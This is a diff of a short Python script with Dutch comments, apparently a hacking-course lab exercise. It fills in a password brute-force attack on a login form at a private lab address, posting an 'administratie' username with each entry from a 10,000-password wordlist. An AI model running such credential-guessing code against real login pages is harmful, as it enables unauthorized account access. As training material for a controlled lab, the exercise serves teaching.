@@ -1,7 +1,8 @@
 import requests
+import dirsearch
 
 # Welke webpagina 'forcen'. Opgelet: Dit is niet de inlogpagina zelf.
-URL = "http://172.16.1.37:8888" 
+URL = "http://172.16.1.37:8888/super_login_query.php" 
 
 # Wat is de gebruikersnaam (Moet in lijst staan!)
 users = ["administratie"] # gebruikersnaam bekend? Vul hier aan.
@@ -27,14 +28,15 @@ with open("hfst_7_hacken/10000-password-seclist.txt", "r") as lines:
 for user in users:
     for password in passwords:
         # Zet data klaar om te posten
-        data = "VUL AAN"
+        data = {'admin_id':user, 'password':password, 'login':''}
 
         # Verzend POST request
         response = requests.post(URL, data=data)
 
+        print(response.text)
         # Controleer of login geslaagd is (OBV inhoud webpagina)
-        if "VUL AAN" in response.text:
-            print(f"Incorrecte Combinatie. Naam:{user} Wachtwoord:{password}.")
-        else:
-            print(f"Je bent binnen! Naam:{user} Wachtwoord:{password}")
-            break
+        # if "Incorrect" in response.text:
+        #     print(f"Incorrecte Combinatie. Naam:{user} Wachtwoord:{password}.")
+        # else:
+        #     print(f"Je bent binnen! Naam:{user} Wachtwoord:{password}")
+        #     break
